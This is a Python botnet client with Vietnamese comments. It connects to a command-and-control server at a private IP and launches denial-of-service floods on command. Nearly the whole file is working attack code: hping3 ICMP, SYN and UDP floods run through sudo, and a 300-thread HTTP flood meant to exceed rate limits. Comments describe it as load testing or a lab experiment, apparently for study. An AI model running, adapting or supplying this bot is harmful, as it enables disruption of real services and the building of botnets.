import os
import socket
import subprocess
import threading
import time
import requests


class AttackManager:

    def __init__(self):
        self.process = None
        self.is_attacking = False
        self._http_stop_event = threading.Event()

    def _http_worker(self, target, port):
        """Hàm phụ trợ chạy đa luồng tối ưu hóa bằng requests.Session()

        để gửi HTTP request liên tục nhằm kiểm thử bộ cân bằng tải.
        """
        url = f"http://{target}:{port}/"
        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                " AppleWebKit/537.36 (KHTML, like Gecko)"
                " Chrome/120.0.0.0 Safari/537.36"
            )
        }

        # Sử dụng Session để tái sử dụng kết nối TCP (Keep-Alive), tăng đáng kể số Req/s
        session = requests.Session()

        while not self._http_stop_event.is_set():
            try:
                # Giảm timeout xuống 0.5s để giải phóng luồng nhanh hơn nếu server phản hồi chậm
                session.get(url, headers=headers, timeout=0.5)
            except Exception:
                # Bỏ qua các lỗi Timeout hoặc Connection Refused khi server quá tải
                pass

    def start_attack(self, target, port, attack_type, num_threads=300):
        if self.is_attacking:
            return

        print(
            f"\n[!] BẮT ĐẦU THỰC NGHIỆM TẢI TỪ C2: {target}:{port} | Loại:"
            f" {attack_type}"
        )

        if attack_type == "PINGFLOOD":
            cmd = f"sudo hping3 -1 --flood {target}"
            try:
                self.process = subprocess.Popen(
                    cmd, shell=True, preexec_fn=os.setsid
                )
                self.is_attacking = True
            except Exception as e:
                print(f"[-] Lỗi khi khởi chạy hping3: {e}")

        elif attack_type == "SYNFLOOD":
            cmd = f"sudo hping3 -S --flood -p {port} {target}"
            try:
                self.process = subprocess.Popen(
                    cmd, shell=True, preexec_fn=os.setsid
                )
                self.is_attacking = True
            except Exception as e:
                print(f"[-] Lỗi khi khởi chạy hping3: {e}")

        elif attack_type == "UDPFLOOD":
            cmd = f"sudo hping3 -2 --flood {target}"
            try:
                self.process = subprocess.Popen(
                    cmd, shell=True, preexec_fn=os.setsid
                )
                self.is_attacking = True
            except Exception as e:
                print(f"[-] Lỗi khi khởi chạy hping3: {e}")

        elif attack_type == "HTTPFLOOD":
            self._http_stop_event.clear()
            self.is_attacking = True

            # Nâng số lượng luồng đồng thời (mặc định 300 luồng) để vượt ngưỡng Rate Limit L7
            print(
f"[*] Đang khởi tạo {num_threads} luồng HTTP Flood tới"
                f" {target}:{port}..."
            )
            for _ in range(num_threads):
                t = threading.Thread(
                    target=self._http_worker, args=(target, port)
                )
                t.daemon = True
                t.start()
            print(
                f"[+] Đã kích hoạt thành công {num_threads} luồng HTTP Flood."
            )

        else:
            cmd = f"sudo hping3 -1 --flood {target}"
            try:
                self.process = subprocess.Popen(
                    cmd, shell=True, preexec_fn=os.setsid
                )
                self.is_attacking = True
            except Exception as e:
                print(f"[-] Lỗi khi khởi chạy hping3: {e}")

    def stop_attack(self):
        if self.is_attacking:
            print(
                "\n[*] NHẬN LỆNH DỪNG TỪ C2. Đang dọn dẹp tiến trình dội"
                " tải..."
            )
            # Dừng tiến trình hping3 nếu có
            os.system("sudo killall -9 hping3 2>/dev/null")
            # Dừng các luồng HTTP Flood
            self._http_stop_event.set()
            self.process = None
            self.is_attacking = False


def Main():
    host = "172.20.10.8"  # IP máy điều khiển C2 Server
    port = 5555
    attacker = AttackManager()

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("[+] Đã kết nối tới C2 Server thành công!")
            last_cmd = ""

            while True:
                # Gửi heartbeat duy trì kết nối với C2
                s.send("HEARTBEAT".encode())
                time.sleep(2)

                data = s.recv(1024)
                if not data:
                    break

                # Tách chuỗi lệnh C2 (Ví dụ: 172.20.10.6_80_LAUNCH_HTTPFLOOD)
                msg_parts = data.decode("utf-8", errors="ignore").split("_")
                if len(msg_parts) >= 4:
                    target_ip = msg_parts[0]
                    target_port = int(msg_parts[1])
                    cmd_code = msg_parts[2]  # LAUNCH, HALT, HOLD
                    attack_type = msg_parts[
                        3
                    ]  # PINGFLOOD, SYNFLOOD, HTTPFLOOD

                    if cmd_code != last_cmd:
                        print(
                            f"[*] C2 Trạng thái mới: {cmd_code} | Target:"
                            f" {target_ip}:{target_port} | Type: {attack_type}"
                        )
                        last_cmd = cmd_code

                        if cmd_code == "LAUNCH":
                            # Truyền thêm num_threads=300 để tạo tải lớn hơn
                            attacker.start_attack(
                                target_ip,
                                target_port,
attack_type,
                                num_threads=300,
                            )
                        elif cmd_code in ["HALT", "HOLD"]:
                            attacker.stop_attack()

        except Exception as e:
            attacker.stop_attack()
            print(
                f"Chưa kết nối được C2 Server ({e}). Thử lại sau 10 giây..."
            )
            time.sleep(10)


if __name__ == "__main__":
    Main()
